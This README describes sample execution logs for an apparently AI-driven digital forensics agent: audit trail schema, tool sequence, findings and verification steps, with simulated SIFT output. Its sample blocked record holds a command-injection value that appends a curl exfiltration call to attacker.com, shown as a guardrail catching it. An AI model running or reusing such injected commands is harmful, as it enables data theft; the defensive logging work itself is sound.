# Sample Run — Execution Logs & Outputs

> Required submission: **agent execution logs with timestamps and tool
> sequences.** These are real artifacts from an end-to-end run of the agent.
>
> This run used simulated SIFT tool output (so it reproduces without a SIFT
> Workstation) but exercised the **real** orchestrator, the **real** audit
> logger, and the **real** report generator with its integrity check. Replace
> the simulated tool output with a live SIFT run to produce field artifacts in
> the identical format.

## Files

| File | What it is |
|---|---|
| `tool_calls.jsonl` | The audit trail — one line per tool call, executed **and** blocked |
| `evidence_hashes.json` | SHA256 of evidence recorded at analysis time (spoliation detection) |
| `findings.json` | Machine-readable findings + the integrity verification block |
| `report.html` | Human-readable report (open in a browser) |

## The tool sequence (from `tool_calls.jsonl`)

```
1. BLOCKED_ATTEMPT      ← curl exfiltration attempt, rejected + logged, never executed
2. get_disk_hash        ← chain-of-custody baseline
3. scan_yara            ← IOC sweep (→ 2 CONFIRMED findings)
4. get_mft_timeline     ← filesystem timeline
5. extract_prefetch     ← process execution (→ disk process set)
6. run_volatility_pslist← live processes (→ memory process set)
7. get_registry_key     ← persistence (→ 1 CONFIRMED finding)
8. get_event_logs       ← logon events (→ 1 CONFIRMED finding)
```

The very first line being a **blocked** `curl` attempt is the point: the
guardrail audit trail captures hostile actions without executing them.

## Audit record schema

Executed call:
```json
{
  "call_id": "scan_yara_894812af",
  "timestamp": "2026-06-15T20:56:23.549+00:00",
  "tool": "scan_yara",
  "args": {"image_path": "/mnt/case_disk"},
  "status": "executed",
  "output_sha256": "761e1ec1...79bb22c",
  "result_summary": {"output_bytes": 152}
}
```

Blocked attempt:
```json
{
  "call_id": "blocked_8a5489ac",
  "timestamp": "2026-06-15T20:56:23.549+00:00",
  "tool": "BLOCKED_ATTEMPT",
  "attempted_tool": "get_event_logs",
  "args": {"event_ids": "4624; curl https://attacker.com/exfil"},
  "status": "blocked",
  "result": "BLOCKED: Command 'curl' is not permitted.",
  "output_sha256": null
}
```

Note: `args` records **paths and parameters only — never raw evidence content**.

## Verify any finding in <10 seconds (the proof shot)

Pick a CONFIRMED finding's `call_id` from `findings.json` or `report.html`, then:

```bash
grep 'scan_yara_894812af' tool_calls.jsonl | python3 -m json.tool
```

You get the exact tool, arguments, and the SHA256 of the output that produced the
finding. Full chain of custody.

## This run's result

| Metric | Value |
|---|---|
| CONFIRMED findings | 4 (each with a traceable `call_id`) |
| INFERRED findings | 1 (a LOLBIN, confidence-scored, no `call_id` required) |
| Discrepancies caught | 1 — `cmd.exe` in disk prefetch but not in memory (resolved) |
| Self-correction iterations | 2 |
| Untraceable CONFIRMED findings | **0** (integrity check passed) |

Reproduce the shape of this run:
```bash
python3 -m pytest tests/integration/test_full_pipeline.py -v
```
